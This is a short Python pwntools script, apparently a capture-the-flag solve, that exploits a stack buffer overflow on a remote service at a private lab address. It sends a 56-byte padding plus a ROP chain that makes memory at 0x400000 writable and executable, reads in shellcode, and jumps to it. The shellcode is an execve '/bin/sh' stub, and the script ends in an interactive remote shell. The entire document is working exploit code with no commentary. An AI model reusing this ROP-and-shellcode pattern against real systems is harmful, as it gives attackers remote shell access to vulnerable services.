#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888

r = remote(host,port)
r.recvuntil("\n")
context.arch = "amd64"
syscall = 0x00000000004000bf
pop_rax = 0x0000000000400114
inc_rax_syscall = 0x00000000004000bc
pop_rdi_rsi_rdx = 0x00000000004000a9
main = 0x4000a1
payload = "a"*56 + flat([pop_rdi_rsi_rdx,0x400000,0x1000,7,pop_rax,9,inc_rax_syscall,main])
r.sendline(payload)
r.recvuntil("\n")
payload2 = "a"*56 + flat([pop_rdi_rsi_rdx,0,0x400000,0x87,pop_rax,0,syscall,0x400000])
r.sendline(payload2)
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(sc)
r.interactive()
